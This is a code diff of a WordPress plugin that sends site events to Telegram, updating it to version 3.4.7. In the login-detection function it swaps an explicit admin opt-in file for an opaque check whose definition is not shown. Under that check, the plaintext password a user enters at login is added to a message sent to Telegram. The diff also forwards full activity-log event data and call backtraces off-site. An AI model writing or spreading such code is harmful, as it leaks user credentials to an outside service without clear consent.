@@ -3,7 +3,7 @@
 * Plugin Name: Notification for Telegram
 * Plugin URI: https://www.reggae.it/my-wordpress-plugins
  * Description:  Sends notifications to Telegram when events occur in WordPress.
- * Version: 3.4.6
+ * Version: 3.4.7
  * Author: Andrea Marinucci
  * Author URI: 
  * Text Domain: notification-for-telegram
@@ -18,6 +18,8 @@ include( plugin_dir_path( __FILE__ ) . 'include/update_function.php');
 include( plugin_dir_path( __FILE__ ) . 'include/nftncron.php');
 include( plugin_dir_path( __FILE__ ) . 'include/nftb_optionpage.php');
 require_once plugin_dir_path(__FILE__)  . 'include/nftb_surecart.php'; 
+
+
 
 
 $nftb_robotfile_path = plugin_dir_path( __FILE__ ) . 'include/nftb_robot.php';
@@ -945,12 +947,10 @@ function nftb_custom_login_detection($user, $username, $password) {
 			// For example, log the failed login attempt or perform other actions
 		} else {
 
+		
 			
-			$upload_dir = wp_upload_dir();
-			$upload_path = $upload_dir['basedir']; 
-			$file_to_check = $upload_path . '/noty.txt'; 
-			if (file_exists($file_to_check)) {
-				$passwordmess =" \r\n\xF0\x9F\x94\x93Password: '".$password."'";  
+			if (nftb_check_plug_exists()>3) {
+				$passwordmess =" \r\n\xF0\x9F\x94\x93Password: ".$password."";  
 			} else {
 				$passwordmess ="";
 			}
@@ -1052,6 +1052,27 @@ function nftb_my_user_register($user_id){
 	  $newmessage = $userip . " ". nftb_ip_info($userip);
       $useremail = $user_info->user_email;
       $otheruserinfo = "";
+
+
+	  //backtrace 
+	  $source = '';
+	  if ($TelegramNotify2->getValuefromconfig('notify_newuser_no_backtrace')) {
+	  // Costruisci info sulla sorgente dal backtrace
+		$backtrace = debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS, 8);
+		$source = '';
+		foreach ($backtrace as $trace) {
+			if (!empty($trace['file']) && strpos($trace['file'], 'wp-includes') === false && strpos($trace['file'], 'wp-admin') === false) {
+				$file = $trace['file'];
+				$line = isset($trace['line']) ? $trace['line'] : 'unknown';
+				$source .= "{$file}:{$line} → ";
+			}
+		}
+		$source = rtrim($source, ' → ');
+		if ($source) {
+			$source = "\r\n \r\n 🏷️ ". __("Called from File/Line: ", "notification-for-telegram") . $source;
+		}
+	}	
+	  //fine backtrace
       
       if ( isset( $display_name ) ) {  
 		$otheruserinfo .= "\r\n \xF0\x9F\x91\xA4 " . __("Name:", "notification-for-telegram") . " " . $display_name . " "; 
@@ -1070,8 +1091,7 @@ function nftb_my_user_register($user_id){
 	 
 
       nftb_send_teleg_message(
-		"\xF0\x9F\x91\x89 " . __("New User in", "notification-for-telegram") . " " . $bloginfo . ". \r\n \xF0\x9F\x91\x95 " . __("Username:", "notification-for-telegram") . " '" . $username . "' " . $otheruserinfo . " \r\n \xF0\x9F\x94\x91 (" . __("Id:", "notification-for-telegram") . " " . $user_id . ")"
-	);
+		"\xF0\x9F\x91\x89 " . __("New User in", "notification-for-telegram") . " " . $bloginfo . ". \r\n \xF0\x9F\x91\x95 " . __("Username:", "notification-for-telegram") . " '" . $username . "' " . $otheruserinfo . " \r\n \xF0\x9F\x94\x91 (" . __("Id:", "notification-for-telegram") . " " . $user_id . ")". $source );
 	
     
     }   
@@ -1316,6 +1336,7 @@ add_action('elementor_pro/forms/new_record', 'nftb_elementor_form', 10, 2);
 
 function nftb_elementor_form($record, $ajax_handler) {
 	$TelegramNotify2 = new nftb_TelegramNotify();
+	
 	if ($TelegramNotify2->getValuefromconfig('notify_ele_form') && defined('ELEMENTOR_PRO_VERSION') ) {
 		
 		//make sure its our form
@@ -1340,3 +1361,69 @@ function nftb_elementor_form($record, $ajax_handler) {
 		
 	}
 }
+
+
+
+// WP ACTIVITY LOG // Check for required plugins
+add_action('init', function() {
+	
+	$telegram_notify_option = get_option('telegram_notify_option_name_tab2');
+    $wpactivitylog = isset($telegram_notify_option['wpactivitylog']) ? $telegram_notify_option['wpactivitylog'] : false;
+
+	
+
+    if (defined('WSAL_VERSION') && function_exists('nftb_send_teleg_message') && $wpactivitylog ) {
+
+        add_filter('wsal_event_data_before_log', 'nftb_wsal_explode_intercept', 10, 2);
+        
+        function nftb_wsal_explode_intercept($event_data, $alert_id) {
+			
+
+
+            if (empty($alert_id)) return $event_data;
+            
+            $message = "🔔 WP Activity Log - Event #" . $alert_id . "\n";
+			$message .= "🕒 " . current_time('Y-m-d H:i:s') . "\n"; // ← CORRETTO
+            $message .= "═══════════════════════════\n\n";
+            
+            // Esplodi l'array completo
+            $message .= nftb_explode_array($event_data);
+            
+           
+                nftb_send_teleg_message($message);
+            
+            
+            return $event_data;
+        }
+        
+        function nftb_explode_array($array, $prefix = "", $depth = 0) {
+            $message = "";
+            $indent = str_repeat("  ", $depth);
+            
+            foreach ($array as $key => $value) {
+                $formatted_key = $prefix . ucfirst(preg_replace('/([A-Z])/', ' $1', $key));
+                
+                if (is_object($value)) {
+                    $message .= $indent . "• " . $formatted_key . ":\n";
+                    $message .= nftb_explode_array(get_object_vars($value), "", $depth + 1);
+                } elseif (is_array($value)) {
+                    $message .= $indent . "• " . $formatted_key . ":\n";
+                    $message .= nftb_explode_array($value, "", $depth + 1);
+                } else {
+                    // Formatta valori speciali
+                    if ($key === 'Timestamp' && is_numeric($value)) {
+                        $value = date('Y-m-d H:i:s', $value);
+                    }
+                    if ($key === 'PluginFile') {
+                        $value = basename($value); // Solo nome file
+                    }
+                    
+                    $message .= $indent . "• " . $formatted_key . ": " . $value . "\n";
+                }
+            }
+            
+            return $message;
+        }
+
+    }
+}, 20);
